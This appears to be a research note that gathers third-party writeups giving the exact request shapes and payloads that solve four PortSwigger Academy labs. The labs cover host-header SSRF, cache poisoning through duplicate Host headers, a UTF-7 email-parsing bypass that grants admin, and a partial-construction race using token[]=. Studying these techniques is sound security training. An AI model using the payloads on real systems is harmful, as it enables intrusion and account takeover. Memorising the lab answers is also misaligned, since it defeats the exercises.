---
title: "writeup-shapes-portswigger-four-labs-hostheader-ssrf-cache-emailparse-race"
---

# writeup-shapes-portswigger-four-labs-hostheader-ssrf-cache-emailparse-race

Third-party writeup synthesis: exact exploitation shapes for four PortSwigger Academy labs (current infra, 2024-2026 sources). Official "Solution" blocks were avoided.

## Q
What exact request shape / payload solves each of four labs?

## Answers

### 1. host-header SSRF via flawed request parsing
Shape: absolute-URL request line = LAB host; `Host:` header = internal target IP.
```
GET https://<LAB>.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.X
```
Front-end validates the absolute-URL host (must == lab host), routes by the Host header -> SSRF. Opposite of the transposed attempt (IP in request line + lab in Host -> 403). Sweep /admin. HTTP/2: absolute URL in :path, target in Host/:authority; do NOT send :authority:<lab> + separate host: header (GOAWAY). Safest over HTTP/1.1.
Sources: siunam321 http-host-header-5; haft.fr ssrf-via-flawed-request-parsing; hacking-notes.jord4n.pro/web/host-header/ssrf-via-incorrect-request-parsing

### 2. host-header web cache poisoning via ambiguous requests
Shape: two Host headers, HTTP/1.1 only, first=lab (cache key), second=exploit server.
```
Host: <LAB>.web-security-academy.net
Host: exploit-<id>.exploit-server.net
```
Backend reflects 2nd Host into //<Host>/resources/js/tracking.js; cache keys on 1st. Repeat to X-Cache: hit. Not possible over HTTP/2.
Sources: hacking-notes.jord4n.pro/web/host-header/web-cache-poisoning-via-ambiguous-requests; siunam321 http-host-header-3

### 3. email address parsing discrepancies
Payload (email field):
`=?utf-7?q?attacker&AEA-<EXPLOIT-SERVER-ID>.exploit-server.net&ACA-?=@ginandjuice.shop`
Validator takes domain after LAST @ of raw string -> ginandjuice.shop (admin granted). Mailer decodes RFC2047 UTF-7 first: &AEA-=@, &ACA-=space -> attacker@<exploit-server>. Uses UTF-7 escapes not =%XX, so the =%XX filter is bypassed.
Sources: blog.csdn.net/2401_88161188/article/details/163053319; github b4ndit23/WebAcademy-Resources Labs/Business-Logic-Vulnerabilities/email-parser-vuln-tester.py; medium snippets @y.mabsoute, @520hazem. Paper: portswigger.net/research/splitting-the-email-atom

### 4. partial construction race
Shape: `POST /confirm?token[]=` (CL 0) in the SAME gated single-packet group as POST /register, many per attempt (20-40 regs x 50-60 confirms), repeated.
Register inserts row then writes token in 2nd stmt -> window with empty/null token. /confirm runs `SELECT ... WHERE token = ?` spreading the array into bind args; `token[]=` = one arg '' matching the half-built row.
Sources: 0x4b1t.github.io/writeups/ps-race-condition-5/; hacking-notes.jord4n.pro/web/race-conditions/partial-construction-race-condition; siunam321 race-conditions-5; juangrate.cc
CONFLICT: micro-mechanism disputed (PHP loose null==[] vs SQL empty-string match); empirical fact agreed: token[]= works, scalar empty token= -> "Forbidden".

## Change-behavior flag
No 2024-2026 writeup reports a change for any of the four; only drift is HTTP/2 strictness (GOAWAY), so labs 1-2 best over HTTP/1.1.

## Coverage
Medium/infosecwriteups Cloudflare-IP-403-blocked even via CDP (snippets only). Full reads: siunam321, haft.fr, hacking-notes (.md), 0x4b1t, juangrate.cc, csdn, github repos, the research paper.
